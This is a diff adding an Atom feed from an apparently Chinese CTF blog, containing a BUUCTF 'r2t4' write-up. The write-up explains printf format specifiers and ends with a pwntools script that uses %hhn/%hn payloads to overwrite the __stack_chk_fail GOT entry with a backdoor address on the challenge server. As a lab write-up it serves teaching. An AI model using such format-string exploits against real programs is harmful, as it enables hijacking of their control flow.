@@ -1,0 +1,88 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://niyah.cn</id>
+    <title>-NIYAH- • Posts by &#34;格式化字符串&#34; tag</title>
+    <link href="http://niyah.cn" />
+    <updated>2021-01-30T06:10:27.000Z</updated>
+    <category term="CTF" />
+    <category term="PWN" />
+    <category term="BUUCTF" />
+    <category term="rop" />
+    <category term="栈迁移" />
+    <category term="格式化字符串" />
+    <entry>
+        <id>http://niyah.cn/BUUCTF/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/</id>
+        <title>格式化字符串</title>
+        <link rel="alternate" href="http://niyah.cn/BUUCTF/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B04/"/>
+        <content type="html">&lt;h2 id=&#34;r2t4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#r2t4&#34;&gt;#&lt;/a&gt; r2t4&lt;/h2&gt;
+&lt;p&gt;本题是个格式化字符串漏洞&lt;/p&gt;
+&lt;p&gt;这里我们了解一下格式化字符串的格式，其基本格式如下&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%[parameter][flags][field width][.precision][length]type&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;每一种 pattern 的含义请具体参考维基百科的&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2&#34;&gt;格式化字符串&lt;/a&gt; 。以下几个 pattern 中的对应选择需要重点关注&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;parameter
+&lt;ul&gt;
+&lt;li&gt;n$，获取格式化字符串中的指定参数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;flag&lt;/li&gt;
+&lt;li&gt;field width
+&lt;ul&gt;
+&lt;li&gt;输出的最小宽度&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;precision
+&lt;ul&gt;
+&lt;li&gt;输出的最大长度&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;length，输出的长度
+&lt;ul&gt;
+&lt;li&gt;hh，输出一个字节&lt;/li&gt;
+&lt;li&gt;h，输出一个双字节&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;type
+&lt;ul&gt;
+&lt;li&gt;d/i，有符号整数&lt;/li&gt;
+&lt;li&gt;u，无符号整数&lt;/li&gt;
+&lt;li&gt;x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。&lt;/li&gt;
+&lt;li&gt;o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。&lt;/li&gt;
+&lt;li&gt;s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。&lt;/li&gt;
+&lt;li&gt;c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。&lt;/li&gt;
+&lt;li&gt;p， void * 型，输出对应变量的值。printf (&amp;quot;% p&amp;quot;,a) 用地址的格式打印变量 a 的值，printf (&amp;quot;% p&amp;quot;, &amp;amp;a) 打印变量 a 所在的地址。&lt;/li&gt;
+&lt;li&gt;n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。&lt;/li&gt;
+&lt;li&gt;%， &#39; &lt;code&gt;%&lt;/code&gt; &#39; 字面值，不接受任何 flags, width。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;首先确定参数偏移&lt;/p&gt;
+&lt;p&gt;进入 IDA 进行分析，直接可以看到有一个后门函数可以直接输出 flag，我们只需要调用它就行了&lt;/p&gt;
+&lt;p&gt;这题是有 canary 的，但是没有关系，检查 canary 后会执行那个 **__stack_chk_fail** 函数，那么我们利用格式化字符串修改这个函数的地址为后门函数地址就可以输出 flag 了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;​	backdoor : 0x0000000000400626&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;​	__stack_chk_fail : 0x0000000000601038&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们需要将第二个地址的值改为第一个地址，这里有两种方式&lt;/p&gt;
+&lt;p&gt;我比较推荐单地址修改的方法，因为一个地址对应在我们看来的两位，而这些地址的存放方式是小端序，所以 0x601038 表示的是最后两位 0x60103A 表示的是倒数第三和倒数第四位&lt;/p&gt;
+&lt;p&gt;那么我们按照单字节修改的方式可以将地址划分为三块&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;​	60 10 38&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;​	40 06 26&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;那么我们从最小的开始修改，即 0x06，我们使用 %6c 输出再使用 % x$hhn 修改格式化字符串的第 x 个参数，这个参数即__stack_chk_fail +1&lt;/p&gt;
+&lt;p&gt;之后是第二小的，即 0x26，因为我们前面已经输出了 0x06 个字符，所以我们这次只需要输出 0x20 个字符，再使用 % y$hhn 修改格式化字符串的第 y 个参数，即__stack_chk_fail&lt;/p&gt;
+&lt;p&gt;从小到大依次修改，最后再计算一下参数偏移就大功告成了&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#coding=utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./r2t4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,word_size=&lt;span class=&#34;string&#34;&gt;&amp;#x27;64&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node3.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28241&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jump = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__stack_chk_fail&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;%6c%10$hhn%32c%11$hhn%26c%12$hhn&amp;#x27;&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;#单地址修改payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;%64c%9$hn%1510c%10$hnAAA&amp;quot;&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;#双地址修改payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload3 = payload1 + p64(jump+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(jump) +p64(jump+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload4 = payload2 + p64(jump+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+ p64(jump)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <category term="CTF" />
+        <category term="PWN" />
+        <category term="BUUCTF" />
+        <category term="格式化字符串" />
+        <updated>2021-01-30T06:10:27.000Z</updated>
+    </entry>
+</feed>
